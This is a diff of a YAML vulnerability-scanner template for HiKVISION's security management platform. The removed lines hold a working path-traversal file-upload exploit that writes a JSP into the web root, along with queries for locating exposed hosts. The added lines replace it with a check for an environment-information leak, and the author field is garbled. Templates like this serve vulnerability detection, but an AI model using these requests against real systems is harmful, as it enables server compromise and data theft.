@@ -1,40 +1,27 @@
 id: HiKVISION
 
 info:
-  name: HiKVISION Comprehensive Security Management Platform Report Arbitrary File Upload Vulnerability
-  author: Zero Trust Security Attack and Defense Laboratory
-  severity: high
+  name: HiKVISION Integrated Security Management Platform Env Information Leakage Vulnerability
+  author: zerZero Trust Security Attack and Defense Laboratoryo
+  severity: medium
   description: |
-    There is an arbitrary file upload vulnerability in the HiKVISION comprehensive security management platform report interface. Attackers can upload arbitrary files and obtain server privileges by constructing special request packets
+    There is an information leakage vulnerability in the HIKVISION comprehensive security management platform, which allows attackers to obtain sensitive information such as environmental env for further attacks
   metadata:
-    fofa-query: app="HIKVISION-综合安防管理平台" || title=="综合安防管理平台"
+    fofa-query: app="HIKVISION-综合安防管理平台"
     hunter-query: web.icon="3670cbb1369332b296ce44a94b7dd685"
 
 http:
-  - raw:
-      - |
-          POST /svm/api/external/report HTTP/1.1
-          Host: {{Hostname}}
-          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+  - method: GET
+    path:
+      - "{{BaseURL}}/artemis-portal/artemis/env"
 
-          ------WebKitFormBoundary9PggsiM755PLa54a
-          Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/test.jsp"
-          Content-Type: application/zip
-
-          <%out.print("test");%>
-
-          ------WebKitFormBoundary9PggsiM755PLa54a--
-      - |
-          GET /portal/ui/login/..;/..;/test.jsp  HTTP/1.1
-          Host: {{Hostname}}
-          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
-      
-    req-condition: true
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_1 == 200'
-          - 'contains(body_1, "data")'
-          - 'status_code_2 == 200'
-          - 'contains(body_2, "test")'
-        condition: and
+      - type: word
+        part: body
+        words:
+          - "profiles"
+
+      - type: status
+        status:
+          - 200
